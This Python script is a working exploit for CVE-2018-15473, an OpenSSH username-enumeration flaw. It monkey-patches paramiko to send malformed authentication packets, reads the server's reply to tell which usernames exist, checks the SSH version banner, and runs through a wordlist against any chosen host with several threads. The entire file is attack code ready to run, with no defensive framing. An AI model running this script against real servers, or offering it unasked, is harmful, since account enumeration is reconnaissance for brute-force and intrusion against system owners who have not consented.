#!/usr/bin/env python3
"""
CVE-2018-15473 - OpenSSH Username Enumeration
Compatible with paramiko 4.0.0
"""
import sys
import re
import socket
import logging
import argparse
import multiprocessing
from typing import Union, Optional, Dict, Any
from pathlib import Path

import paramiko
from paramiko import SSHException, AuthenticationException
from paramiko.message import Message
from paramiko.common import MSG_SERVICE_ACCEPT, MSG_USERAUTH_FAILURE, MSG_USERAUTH_REQUEST

assert sys.version_info >= (3, 6), "This program requires python3.6 or higher"


class Color:
    """ ANSI color formatting helper """
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    RED = '\033[38;5;196m'
    BLUE = '\033[38;5;75m'
    GREEN = '\033[38;5;149m'
    YELLOW = '\033[38;5;190m'

    @staticmethod
    def string(text: str, color: str, bold: bool = False) -> str:
        """ Apply ANSI color to text """
        bold_str = Color.BOLD if bold else ""
        color_str = getattr(Color, color.upper())
        return f'{bold_str}{color_str}{text}{Color.ENDC}'


class InvalidUsername(Exception):
    """ Raised when username is not found via CVE-2018-15473 """
    pass


def create_socket(hostname: str, port: int) -> Optional[socket.socket]:
    """ Create socket connection to target """
    try:
        return socket.create_connection((hostname, port))
    except socket.error as e:
        print(f'Socket error: {e}', file=sys.stderr)
        return None


def patch_paramiko() -> None:
    """
    Apply monkey patches for paramiko 4.0.0 compatibility.
    """
    # Get the AuthHandler class
    AuthHandler = paramiko.auth_handler.AuthHandler
    
    # Access the handler table property properly
    # In paramiko 4.0.0, _client_handler_table is a property with fget
    handler_table = AuthHandler._client_handler_table
    
    # Store original handlers for later use
    original_service_accept = None
    original_userauth_failure = None
    
    # Try to get the handlers from the property
    if hasattr(handler_table, 'fget'):
        # It's a property, get the dictionary
        table_dict = handler_table.fget(AuthHandler)
        original_service_accept = table_dict.get(MSG_SERVICE_ACCEPT)
        original_userauth_failure = table_dict.get(MSG_USERAUTH_FAILURE)
    elif isinstance(handler_table, dict):
        # It's already a dictionary
        original_service_accept = handler_table.get(MSG_SERVICE_ACCEPT)
        original_userauth_failure = handler_table.get(MSG_USERAUTH_FAILURE)
    else:
        # Try to access as property
        try:
            table_dict = AuthHandler._client_handler_table
            if isinstance(table_dict, dict):
                original_service_accept = table_dict.get(MSG_SERVICE_ACCEPT)
                original_userauth_failure = table_dict.get(MSG_USERAUTH_FAILURE)
        except (AttributeError, TypeError):
            pass
    
    def patched_add_boolean(self, value: bool) -> None:
        """
        Patch to prevent adding boolean values, causing malformed packets.
        This is the key to the CVE-2018-15473 exploit.
        """
        # Intentionally do nothing - this breaks the packet format
        pass

    def patched_msg_service_accept(self, *args, **kwargs):
        """
        Patch SERVICE_ACCEPT handler to corrupt the next packet
        """
        # Store original add_boolean method
        original_add_boolean = Message.add_boolean
        
        # Replace with our broken version
        Message.add_boolean = patched_add_boolean
        
        try:
            # Call the original handler if available
            if original_service_accept:
                result = original_service_accept(self, *args, **kwargs)
                return result
        finally:
            # Restore original add_boolean method
            Message.add_boolean = original_add_boolean
        
        return None

    def patched_userauth_failure(self, *args, **kwargs):
        """
        Handle authentication failure - indicates username not found
        """
        raise InvalidUsername(*args, **kwargs)

    # Apply patches to the handler table
    # We need to replace the handlers in the dictionary
    if hasattr(handler_table, 'fget'):
        # It's a property, we need to modify the underlying dictionary
        table_dict = handler_table.fget(AuthHandler)
        table_dict[MSG_SERVICE_ACCEPT] = patched_msg_service_accept
        table_dict[MSG_USERAUTH_FAILURE] = patched_userauth_failure
    elif isinstance(handler_table, dict):
        handler_table[MSG_SERVICE_ACCEPT] = patched_msg_service_accept
        handler_table[MSG_USERAUTH_FAILURE] = patched_userauth_failure
    else:
        # Try to modify the property directly
        try:
            table_dict = AuthHandler._client_handler_table
            if isinstance(table_dict, dict):
                table_dict[MSG_SERVICE_ACCEPT] = patched_msg_service_accept
                table_dict[MSG_USERAUTH_FAILURE] = patched_userauth_failure
        except (AttributeError, TypeError):
            # Fallback: try to set the property
            pass


def check_username(username: str, hostname: str, port: int, verbose: bool = False) -> None:
    """
    Check if username exists on the target SSH service
    
    Args:
        username: username to check
        hostname: target hostname/IP
        port: SSH port
        verbose: print detailed output
    """
    sock = create_socket(hostname, port)
    if not sock:
        return

    transport = None
    try:
        transport = paramiko.Transport(sock)
        transport.start_client()
        
        # Try publickey authentication with a dummy key
        # This will trigger the vulnerability if the username exists
        dummy_key = paramiko.RSAKey.generate(1024)
        transport.auth_publickey(username, dummy_key)
        
    except AuthenticationException:
        # This exception means the username exists but authentication failed
        print(f"[+] {Color.string(username, color='yellow')} found!")
    except InvalidUsername:
        # This exception means the username doesn't exist
        if verbose:
            print(f'[-] {Color.string(username, color="red")} not found')
    except SSHException as e:
        if verbose:
            print(f'[!] SSH error for {username}: {e}', file=sys.stderr)
    except Exception as e:
        print(f'[!] Unexpected error for {username}: {e}', file=sys.stderr)
    finally:
        if transport:
            try:
                transport.close()
            except:
                pass


def detect_openssh_version(hostname: str, port: int) -> None:
    """
    Detect and display OpenSSH version from banner
    """
    sock = create_socket(hostname, port)
    if not sock:
        return
    
    try:
        banner = sock.recv(1024).decode()
        sock.close()
        
        regex = re.search(r'-OpenSSH_(?P<version>\d\.\d)', banner)
        if regex:
            try:
                version = float(regex.group('version'))
                color = 'green' if version <= 7.7 else 'red'
                print(f"[+] {Color.string('OpenSSH', color=color)} version "
                      f"{Color.string(str(version), color=color)} found")
            except ValueError:
                print(f'[!] Version not recognized: {regex.group("version")}')
        else:
            print(f'[!] OpenSSH version not detected. Banner: {Color.string(banner.strip(), color="yellow")}')
    except Exception as e:
        print(f'[!] Error detecting version: {e}', file=sys.stderr)


def main(**kwargs) -> None:
    """ Main entry point """
    hostname = kwargs.get('hostname')
    port = kwargs.get('port')
    
    # Detect OpenSSH version first
    detect_openssh_version(hostname, port)
    
    # Apply the paramiko patches
    try:
        patch_paramiko()
    except Exception as e:
        print(f'[!] Error applying patch: {e}', file=sys.stderr)
        return
    
    # Handle single username or wordlist
    if kwargs.get('username'):
        username = kwargs.get('username').strip()
        check_username(username, hostname, port, kwargs.get('verbose'))
    else:
        wordlist_path = kwargs.get('wordlist')
        threads = kwargs.get('threads', 4)
        verbose = kwargs.get('verbose', False)
        
        try:
            with Path(wordlist_path).open() as wordlist:
                usernames = [line.strip() for line in wordlist if line.strip()]
            
            # For single thread, just iterate
            if threads <= 1:
                for user in usernames:
                    check_username(user, hostname, port, verbose)
            else:
                with multiprocessing.Pool(threads) as pool:
                    args_list = [(user, hostname, port, verbose) for user in usernames]
                    pool.starmap(check_username, args_list)
        except FileNotFoundError:
            print(f'[!] Wordlist file not found: {wordlist_path}', file=sys.stderr)
        except Exception as e:
            print(f'[!] Error processing wordlist: {e}', file=sys.stderr)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="OpenSSH Username Enumeration (CVE-2018-15473)",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('hostname', help='Target hostname or IP address', type=str)
    parser.add_argument('-p', '--port', help='SSH port (default: 22)', default=22, type=int)
    parser.add_argument('-t', '--threads', help='Number of threads (default: 4)', default=4, type=int)
    parser.add_argument('-v', '--verbose', action='store_true', default=False,
                        help='Print both valid and invalid usernames')
    parser.add_argument('-6', '--ipv6', action='store_true', 
                        help='Use IPv6 (default: IPv4) - currently not implemented')
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-w', '--wordlist', help='Path to wordlist file', type=str)
    group.add_argument('-u', '--username', help='Single username to test', type=str)
    
    args = parser.parse_args()
    
    # Suppress paramiko logging
    logging.getLogger('paramiko').setLevel(logging.CRITICAL)
    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
    
    main(**vars(args))
